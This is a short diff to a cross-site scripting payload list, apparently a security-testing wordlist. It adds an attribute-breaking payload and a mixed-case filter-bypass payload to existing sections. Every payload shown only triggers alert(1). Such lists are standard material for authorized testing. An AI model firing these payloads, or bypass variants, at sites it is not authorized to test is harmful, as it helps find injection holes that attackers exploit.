@@ -5,6 +5,7 @@
 <script>alert(1)</script>
 <img src=x onerror=alert(1)>
 "><svg/onload=alert(1)>
+XSS "><script>alert(1);</script>
 
 ---> XSS Attribute Breaking <---
 " onmouseover=alert(1) x="
@@ -13,6 +14,7 @@
 ---> XSS Bypass Filters <---
 <ScRiPt>alert(1)</ScRiPt>
 <svg><script>alert(1)</script>
+<Img Src=OnXSS OnError=(alert)(1)>
 
 ---> XSS DOM <---
 #<img src=x onerror=alert(1)>
